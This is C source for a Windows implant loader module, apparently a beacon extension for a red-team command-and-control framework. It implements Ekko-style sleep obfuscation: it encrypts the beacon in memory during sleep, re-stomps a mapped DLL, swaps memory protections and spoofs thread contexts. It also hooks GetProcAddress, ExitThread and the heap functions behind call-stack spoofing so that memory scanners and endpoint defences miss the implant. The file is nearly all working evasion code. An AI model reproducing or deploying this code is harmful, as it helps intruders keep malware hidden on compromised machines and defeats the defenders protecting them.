#include <windows.h>
#include "memory.h"
#include "mask.h"
#include "spoof.h"
#include "cleanup.h"
#include "tcg.h"
#define EKKO_CTX_COUNT 18
MEMORY_LAYOUT g_memory;
#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)
#define NtCurrentThread()  ((HANDLE)(LONG_PTR)-2)
DECLSPEC_IMPORT VOID   WINAPI KERNEL32$Sleep       ( DWORD );
DECLSPEC_IMPORT VOID   WINAPI KERNEL32$ExitThread  ( DWORD );
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc   ( HANDLE, DWORD, SIZE_T );
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$HeapFree    ( HANDLE, DWORD, LPVOID );
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapReAlloc ( HANDLE, DWORD, LPVOID, SIZE_T );
DECLSPEC_IMPORT void*    __cdecl MSVCRT$calloc           ( size_t, size_t );
DECLSPEC_IMPORT void     __cdecl MSVCRT$free             ( void* );
DECLSPEC_IMPORT void*    NTAPI  NTDLL$memcpy             ( void*, const void*, size_t );
DECLSPEC_IMPORT HANDLE   WINAPI KERNEL32$GetProcessHeap  ( VOID );
DECLSPEC_IMPORT LPVOID   WINAPI KERNEL32$HeapAlloc       ( HANDLE, DWORD, SIZE_T );
DECLSPEC_IMPORT LPVOID   WINAPI KERNEL32$MapViewOfFile   ( HANDLE, DWORD, DWORD, DWORD, SIZE_T );
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$UnmapViewOfFile ( LPCVOID );
DECLSPEC_IMPORT DWORD    WINAPI KERNEL32$GetCurrentProcessId ( VOID );
DECLSPEC_IMPORT DWORD    WINAPI KERNEL32$GetCurrentThreadId  ( VOID );
DECLSPEC_IMPORT LPVOID   WINAPI KERNEL32$VirtualAlloc    ( LPVOID, SIZE_T, DWORD, DWORD );
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$VirtualFree     ( LPVOID, SIZE_T, DWORD );
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$VirtualProtect  ( LPVOID, SIZE_T, DWORD, PDWORD );
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$FlushInstructionCache ( HANDLE, LPCVOID, SIZE_T );
DECLSPEC_IMPORT HANDLE   WINAPI KERNEL32$OpenThread      ( DWORD, BOOL, DWORD );
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$DuplicateHandle ( HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD );
DECLSPEC_IMPORT HANDLE   WINAPI KERNEL32$CreateEventW    ( LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCWSTR );
DECLSPEC_IMPORT HANDLE   WINAPI KERNEL32$CreateTimerQueue( VOID );
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$CreateTimerQueueTimer ( PHANDLE, HANDLE, WAITORTIMERCALLBACK, PVOID, DWORD, DWORD, ULONG );
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$DeleteTimerQueue( HANDLE );
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$SetEvent        ( HANDLE );
DECLSPEC_IMPORT DWORD    WINAPI KERNEL32$WaitForSingleObject   ( HANDLE, DWORD );
DECLSPEC_IMPORT DWORD    WINAPI KERNEL32$WaitForSingleObjectEx ( HANDLE, DWORD, BOOL );
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$GetThreadContext( HANDLE, LPCONTEXT );
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$SetThreadContext( HANDLE, const CONTEXT* );
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$CloseHandle     ( HANDLE );
DECLSPEC_IMPORT VOID     NTAPI  NTDLL$RtlCaptureContext  ( PCONTEXT );
DECLSPEC_IMPORT NTSTATUS NTAPI  NTDLL$NtContinue         ( PCONTEXT, BOOLEAN );
DECLSPEC_IMPORT NTSTATUS NTAPI  NTDLL$NtQuerySystemInformation ( SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG );
DECLSPEC_IMPORT void*    __cdecl MSVCRT$memset           ( void*, int, size_t );
DECLSPEC_IMPORT void*    __cdecl MSVCRT$memcpy           ( void*, const void*, size_t );
DECLSPEC_IMPORT NTSTATUS WINAPI ADVAPI32$SystemFunction032 ( USTRING, USTRING ); 


static void restore_section_permissions(void)
{
    if (!g_memory.Dll.BaseAddress)
        return;

    DWORD old_protect = 0;

    for (SIZE_T i = 0; i < g_memory.Dll.Count; i++)
    {
        MEMORY_SECTION *sec = &g_memory.Dll.Sections[i];

        if (!sec->BaseAddress || sec->Size == 0)
            continue;

        KERNEL32$VirtualProtect(
            sec->BaseAddress,
            sec->Size,
            sec->PreviousProtect,
            &old_protect
        );

        sec->CurrentProtect = sec->PreviousProtect;
    }

    KERNEL32$FlushInstructionCache(
        (HANDLE)(LONG_PTR)-1,
        g_memory.Dll.BaseAddress,
        g_memory.Dll.Size
    );
}

static ULONG RndThreadId(ULONG CurrentThreadId)
{ 
    PVOID pBuffer = NULL;
    PSYSTEM_PROCESS_INFORMATION pCurrentProc = NULL;
    ULONG RandomThreadId = 0;
    ULONG ReturnLength = 0;
    ULONG TargetPid = (ULONG)KERNEL32$GetCurrentProcessId();

    NTSTATUS status = NTDLL$NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &ReturnLength);
    if (status != STATUS_INFO_LENGTH_MISMATCH) return CurrentThreadId;

    pBuffer = KERNEL32$VirtualAlloc(NULL, ReturnLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pBuffer) return CurrentThreadId;

    status = NTDLL$NtQuerySystemInformation(SystemProcessInformation, pBuffer, ReturnLength, &ReturnLength);
    if (status != 0) {
        KERNEL32$VirtualFree(pBuffer, 0, MEM_RELEASE);
        return CurrentThreadId;
    }

    pCurrentProc = (PSYSTEM_PROCESS_INFORMATION)pBuffer;

    while (TRUE) {
        if ((ULONG_PTR)pCurrentProc->UniqueProcessId == (ULONG_PTR)TargetPid) {
            for (ULONG i = 0; i < pCurrentProc->NumberOfThreads; i++) {
                PSYSTEM_THREAD_INFORMATION pThread = &pCurrentProc->Threads[i];
                ULONG Tid = (ULONG)(ULONG_PTR)pThread->ClientId.UniqueThread;

                if (Tid != CurrentThreadId) {
                    RandomThreadId = Tid;
                    break;
                }
            }
            break; 
        }

        if (pCurrentProc->NextEntryOffset == 0) break;
        
        pCurrentProc = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pCurrentProc + pCurrentProc->NextEntryOffset);
    }
    KERNEL32$VirtualFree(pBuffer, 0, MEM_RELEASE);
    return (RandomThreadId != 0) ? RandomThreadId : CurrentThreadId;
}




/*
=================================================================
*/




FARPROC WINAPI _GetProcAddress ( HMODULE hModule, LPCSTR lpProcName )
{
    /* lpProcName may be an ordinal */
    if ( ( ULONG_PTR ) lpProcName >> 16 == 0 )
    {
        /* just resolve normally */
        return GetProcAddress ( hModule, lpProcName );
    }

    FARPROC result = __resolve_hook ( ror13hash ( lpProcName ) );

    /*
     * result may still be NULL if 
     * it wasn't hooked in the spec
     */
    if ( result != NULL ) {
        return result;
    }
    
    return GetProcAddress ( hModule, lpProcName );
}

void setup_hooks ( IMPORTFUNCS * funcs )
{
    funcs->GetProcAddress = ( __typeof__ ( GetProcAddress ) * ) _GetProcAddress;
}

void setup_memory ( MEMORY_LAYOUT * layout )
{
    if ( layout != NULL ) {
        g_memory = * layout;
    }
}

/* 
 * throw these hooks in here because
 * sharing a global across multiple
 * modules is still a bit of a headache
 */
/* ===== MAIN SLEEP HOOK ===== */
DECLSPEC_IMPORT int __cdecl MSVCRT$printf(const char* format, ...);

VOID WINAPI _Sleep ( DWORD dwMilliseconds )
{
    /* Only use Ekko for sleeps >= 1 second */
    if ( dwMilliseconds < 1000 ) {
        FUNCTION_CALL call = { 0 };
        call.ptr  = ( PVOID ) ( KERNEL32$Sleep );
        call.argc = 1;
        call.args [ 0 ] = spoof_arg ( dwMilliseconds );
        spoof_call ( &call );
        return;
    }

    PCONTEXT g_EkkoContexts = (PCONTEXT)KERNEL32$HeapAlloc(
    KERNEL32$GetProcessHeap(),
    HEAP_ZERO_MEMORY,
    sizeof(CONTEXT) * EKKO_CTX_COUNT
    );

    if (!g_EkkoContexts) {
    return;
    }


   
    ULONG  CurrentThreadId = KERNEL32$GetCurrentThreadId();
    ULONG  RandomThreadId  = RndThreadId(CurrentThreadId);
    //TODO - Remove this after debugging
    static BOOL OneTime = TRUE;
    if (OneTime == TRUE) {
        MSVCRT$printf("[PICO] Got the handle at %p \n", g_memory.pHandle);
        OneTime = FALSE;
    }
    HANDLE DupThreadHandle  = NULL;
    HANDLE MainThreadHandle = NULL;
    DECLSPEC_IMPORT BOOLEAN WINAPI ADVAPI32$SystemFunction036(PVOID, ULONG);
    MSVCRT$memset(g_EkkoContexts, 0, sizeof(CONTEXT) * EKKO_CTX_COUNT);
    HANDLE  hTimerQueue = NULL;
    HANDLE  hNewTimer   = NULL;
    HANDLE  hEvtCapture = NULL;
    HANDLE  hEvtStart   = NULL;
    HANDLE  hEvtEnd     = NULL;
    DWORD   OldProtect  = 0;
    DWORD   DelayTimer  = 0;
    USTRING Buffer;
    CHAR    KeyBuf[16];
    ADVAPI32$SystemFunction036(KeyBuf, 16); 
    USTRING Key;

    MSVCRT$memset(&Key, 0, sizeof(USTRING));

    if (!g_memory.Dll.BaseAddress || !g_memory.Dll.Size) {
        FUNCTION_CALL call = { 0 };
        call.ptr  = ( PVOID ) ( KERNEL32$Sleep );
        call.argc = 1;
        call.args [ 0 ] = spoof_arg ( dwMilliseconds );
        spoof_call ( &call );
        return;
    }

    Key.Buffer = KeyBuf;
    Key.Length  = Key.MaximumLength = 16;

    //taking back up of the beacon 
    if(!g_memory.pBackup) {
        g_memory.pBackup = MSVCRT$calloc(1, g_memory.Dll.Size);
        MSVCRT$printf("[PICO] Allocated heap for backup at %p \n", g_memory.pBackup);
        NTDLL$memcpy(g_memory.pBackup, g_memory.Dll.BaseAddress, g_memory.Dll.Size);
        MSVCRT$printf("[PICO] Moved to the heap\n");
    
    }
    
    Buffer.Buffer = g_memory.pBackup;
    Buffer.Length = Buffer.MaximumLength = g_memory.Dll.Size;
    DupThreadHandle = KERNEL32$OpenThread(THREAD_ALL_ACCESS, FALSE, RandomThreadId);
    KERNEL32$DuplicateHandle(NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &MainThreadHandle, THREAD_ALL_ACCESS, FALSE, 0);

    if (!MainThreadHandle) {
        FUNCTION_CALL call = { 0 };
        call.ptr  = ( PVOID ) ( KERNEL32$Sleep );
        call.argc = 1;
        call.args [ 0 ] = spoof_arg ( dwMilliseconds );
        spoof_call ( &call );
        if (DupThreadHandle) KERNEL32$CloseHandle(DupThreadHandle);
        return;
    }

    hEvtCapture = KERNEL32$CreateEventW(NULL, TRUE, FALSE, NULL);
    hEvtStart   = KERNEL32$CreateEventW(NULL, TRUE, FALSE, NULL);
    hEvtEnd     = KERNEL32$CreateEventW(NULL, TRUE, FALSE, NULL);
    hTimerQueue = KERNEL32$CreateTimerQueue();

    if (!hEvtCapture || !hEvtStart || !hEvtEnd || !hTimerQueue) {
        if (DupThreadHandle)  KERNEL32$CloseHandle(DupThreadHandle);
        if (MainThreadHandle) KERNEL32$CloseHandle(MainThreadHandle);
        if (hEvtCapture) KERNEL32$CloseHandle(hEvtCapture);
        if (hEvtStart)   KERNEL32$CloseHandle(hEvtStart);
        if (hEvtEnd)     KERNEL32$CloseHandle(hEvtEnd);
        if (hTimerQueue) KERNEL32$DeleteTimerQueue(hTimerQueue);
        
        FUNCTION_CALL call = { 0 };
        call.ptr  = ( PVOID ) ( KERNEL32$Sleep );
        call.argc = 1;
        call.args [ 0 ] = spoof_arg ( dwMilliseconds );
        spoof_call ( &call );
        return;
    }

    g_EkkoContexts[14].ContextFlags = CONTEXT_ALL;
    g_EkkoContexts[15].ContextFlags = CONTEXT_ALL;

    if (DupThreadHandle) {
        KERNEL32$GetThreadContext(DupThreadHandle, &g_EkkoContexts[14]);
    }

    
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NTDLL$RtlCaptureContext, &g_EkkoContexts[0], DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)KERNEL32$SetEvent, hEvtCapture, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);

    KERNEL32$WaitForSingleObject(hEvtCapture, INFINITE);

    // FIX THIS TO USE THE COUNTER
    for (int i = 1; i <= 13; i++) {
        MSVCRT$memcpy(&g_EkkoContexts[i], &g_EkkoContexts[0], sizeof(CONTEXT));
        
        g_EkkoContexts[i].Rsp -= sizeof(PVOID);
    }
    //TODO - INCLUDE THIS IN THE LOOP INSTEAD OF THIS


    MSVCRT$memcpy(&g_EkkoContexts[16], &g_EkkoContexts[0], sizeof(CONTEXT));
    MSVCRT$memcpy(&g_EkkoContexts[17], &g_EkkoContexts[0], sizeof(CONTEXT));
    g_EkkoContexts[16].Rsp -= sizeof(PVOID);
    g_EkkoContexts[17].Rsp -= sizeof(PVOID);


    g_EkkoContexts[1].Rip = (DWORD64)KERNEL32$WaitForSingleObject;
    g_EkkoContexts[1].Rcx = (DWORD64)hEvtStart;
    g_EkkoContexts[1].Rdx = (DWORD64)INFINITE;

    g_EkkoContexts[2].Rip = (DWORD64)ADVAPI32$SystemFunction032;
    g_EkkoContexts[2].Rcx = (DWORD64)&Buffer;
    g_EkkoContexts[2].Rdx = (DWORD64)&Key;

    //unmap the sacDll
    g_EkkoContexts[3].Rip = (DWORD64)KERNEL32$UnmapViewOfFile;
    g_EkkoContexts[3].Rcx = (DWORD64)g_memory.Dll.BaseAddress;

    static FUNCTION_CALL MapIt;
    MapIt.ptr  = (PVOID)(KERNEL32$MapViewOfFile);
    MapIt.argc = 5;
    MapIt.args[0] = spoof_arg(g_memory.pHandle);
    MapIt.args[1] = spoof_arg(FILE_MAP_ALL_ACCESS);
    MapIt.args[2] = spoof_arg(0);
    MapIt.args[3] = spoof_arg(0);
    MapIt.args[4] = spoof_arg(0);

    g_EkkoContexts[4].Rip = (DWORD64)spoof_call;
    g_EkkoContexts[4].Rcx = (DWORD64)&MapIt;

    g_EkkoContexts[5].Rip = (DWORD64)KERNEL32$VirtualProtect;
    g_EkkoContexts[5].Rcx = (DWORD64)g_memory.Pico.Code;
    g_EkkoContexts[5].Rdx = (DWORD64)g_memory.PICO_SIZE;
    g_EkkoContexts[5].R8  = PAGE_READWRITE;
    g_EkkoContexts[5].R9  = (DWORD64)&OldProtect;

    g_EkkoContexts[6].Rip = (DWORD64)KERNEL32$GetThreadContext;
    g_EkkoContexts[6].Rcx = (DWORD64)MainThreadHandle;
    g_EkkoContexts[6].Rdx = (DWORD64)&g_EkkoContexts[15];

    g_EkkoContexts[7].Rip = (DWORD64)KERNEL32$SetThreadContext;
    g_EkkoContexts[7].Rcx = (DWORD64)MainThreadHandle;
    g_EkkoContexts[7].Rdx = (DWORD64)&g_EkkoContexts[14];


    g_EkkoContexts[8].Rip = (DWORD64)KERNEL32$WaitForSingleObject;
    g_EkkoContexts[8].Rcx = (DWORD64)(HANDLE)-1;        
    g_EkkoContexts[8].Rdx = (DWORD64)dwMilliseconds; 

    g_EkkoContexts[9].Rip = (DWORD64)KERNEL32$SetThreadContext;
    g_EkkoContexts[9].Rcx = (DWORD64)MainThreadHandle;
    g_EkkoContexts[9].Rdx = (DWORD64)&g_EkkoContexts[15]; //Real context


    g_EkkoContexts[10].Rip = (DWORD64)KERNEL32$VirtualProtect;
    g_EkkoContexts[10].Rcx = (DWORD64)g_memory.Pico.Code;
    g_EkkoContexts[10].Rdx = (DWORD64)g_memory.PICO_SIZE;
    g_EkkoContexts[10].R8  = PAGE_EXECUTE_READ;
    g_EkkoContexts[10].R9  = (DWORD64)&OldProtect;

    g_EkkoContexts[11].Rip = (DWORD64)ADVAPI32$SystemFunction032;
    g_EkkoContexts[11].Rcx = (DWORD64)&Buffer;
    g_EkkoContexts[11].Rdx = (DWORD64)&Key;

    //We need RW to copy beacon

    g_EkkoContexts[12].Rip = (DWORD64)KERNEL32$VirtualProtect;
    g_EkkoContexts[12].Rcx = (DWORD64)g_memory.Dll.BaseAddress;
    g_EkkoContexts[12].Rdx = (DWORD64)g_memory.Dll.Size;
    g_EkkoContexts[12].R8  = PAGE_READWRITE;
    g_EkkoContexts[12].R9  = (DWORD64)&OldProtect;

    // stomp the DLL once again
    g_EkkoContexts[13].Rip = (DWORD64)NTDLL$memcpy;
    g_EkkoContexts[13].Rcx = (DWORD64)g_memory.Dll.BaseAddress;
    g_EkkoContexts[13].Rdx = (DWORD64)g_memory.pBackup;
    g_EkkoContexts[13].R8  = (DWORD64)g_memory.Dll.Size;

    g_EkkoContexts[16].Rip = (DWORD64)restore_section_permissions;
    g_EkkoContexts[16].Rcx = (DWORD64)&g_memory;

    g_EkkoContexts[17].Rip = (DWORD64)KERNEL32$SetEvent;
    g_EkkoContexts[17].Rcx = (DWORD64)hEvtEnd;

    // Can't use loop - lazy to change 14-15 ):
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NTDLL$NtContinue, &g_EkkoContexts[1],   DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NTDLL$NtContinue, &g_EkkoContexts[2], DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NTDLL$NtContinue, &g_EkkoContexts[3], DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NTDLL$NtContinue, &g_EkkoContexts[4], DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NTDLL$NtContinue, &g_EkkoContexts[5], DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NTDLL$NtContinue, &g_EkkoContexts[6],  DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NTDLL$NtContinue, &g_EkkoContexts[7], DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NTDLL$NtContinue, &g_EkkoContexts[8], DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NTDLL$NtContinue, &g_EkkoContexts[9], DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NTDLL$NtContinue, &g_EkkoContexts[10], DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NTDLL$NtContinue, &g_EkkoContexts[11], DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NTDLL$NtContinue, &g_EkkoContexts[12], DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NTDLL$NtContinue, &g_EkkoContexts[13], DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NTDLL$NtContinue, &g_EkkoContexts[16], DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NTDLL$NtContinue, &g_EkkoContexts[17], DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
    
    KERNEL32$SetEvent(hEvtStart);
    KERNEL32$WaitForSingleObject(hEvtEnd, INFINITE);

    //TODO - FREE HEAP !
        
    if (DupThreadHandle)  KERNEL32$CloseHandle(DupThreadHandle);
    if (MainThreadHandle) KERNEL32$CloseHandle(MainThreadHandle);
    KERNEL32$CloseHandle(hEvtCapture);
    KERNEL32$CloseHandle(hEvtStart);
    KERNEL32$CloseHandle(hEvtEnd);
    KERNEL32$DeleteTimerQueue(hTimerQueue);
    MSVCRT$free(g_memory.pBackup);
    MSVCRT$printf("[PICO] Freed heap at %p \n", g_memory.pBackup);
    g_memory.pBackup = NULL;
}

VOID WINAPI _ExitThread ( DWORD dwExitCode )
{
    /* free memory */
    cleanup_memory ( &g_memory );

    /* call the real exit thread */
    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( KERNEL32$ExitThread );
    call.argc = 1;
    
    call.args [ 0 ]  = spoof_arg ( dwExitCode );

    spoof_call ( &call );
}

LPVOID WINAPI _HeapAlloc ( HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes )
{
    LPVOID result = NULL;

    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( KERNEL32$HeapAlloc );
    call.argc = 3;
    
    call.args [ 0 ] = spoof_arg ( hHeap );
    call.args [ 1 ] = spoof_arg ( dwFlags );
    call.args [ 2 ] = spoof_arg ( dwBytes );

    result = ( LPVOID ) spoof_call ( &call );

    /* store a record of this heap allocation */

    if ( dwBytes >= 256 && result != NULL && g_memory.Heap.Count < MAX_HEAP_RECORDS )
    {
        g_memory.Heap.Records [ g_memory.Heap.Count ].Address = result;
        g_memory.Heap.Records [ g_memory.Heap.Count ].Size    = dwBytes;
        g_memory.Heap.Count++;
    }

    return result;
}

LPVOID WINAPI _HeapReAlloc ( HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes )
{
    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( KERNEL32$HeapReAlloc );
    call.argc = 4;
    
    call.args [ 0 ] = spoof_arg ( hHeap );
    call.args [ 1 ] = spoof_arg ( dwFlags );
    call.args [ 2 ] = spoof_arg ( lpMem );
    call.args [ 3 ] = spoof_arg ( dwBytes );

    LPVOID result = ( LPVOID ) spoof_call ( &call );

    if ( result )
    {
        BOOL found = FALSE;

        for ( int i = 0; i < g_memory.Heap.Count; i++ )
        {
            if ( g_memory.Heap.Records [ i ].Address == lpMem )
            {
                g_memory.Heap.Records [ i ].Address = result;
                g_memory.Heap.Records [ i ].Size    = dwBytes;
                found = TRUE;
                break;
            }
        }

        if ( !found && dwBytes >= 256 && g_memory.Heap.Count < MAX_HEAP_RECORDS )
        {
            g_memory.Heap.Records [ g_memory.Heap.Count ].Address = result;
            g_memory.Heap.Records [ g_memory.Heap.Count ].Size    = dwBytes;
            g_memory.Heap.Count++;
        }
    }

    return result;
}


BOOL WINAPI _HeapFree ( HANDLE hHeap, DWORD dwFlags, LPVOID lpMem )
{
    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( KERNEL32$HeapFree );
    call.argc = 3;
    
    call.args [ 0 ] = spoof_arg ( hHeap );
    call.args [ 1 ] = spoof_arg ( dwFlags );
    call.args [ 2 ] = spoof_arg ( lpMem );

    BOOL result = ( BOOL ) spoof_call ( &call );

    if ( result )
    {
        /* remove the right heap record */

        for ( int i = 0; i < g_memory.Heap.Count; i++ )
        {
            if ( g_memory.Heap.Records [ i ].Address == lpMem )
            {
                int last = g_memory.Heap.Count - 1;
                g_memory.Heap.Records [ i ] = g_memory.Heap.Records [ last ];
                g_memory.Heap.Records [ last ].Address = NULL;
                g_memory.Heap.Records [ last ].Size    = 0;
                g_memory.Heap.Count--;
                break;
            }
        }
    }

    return result;
}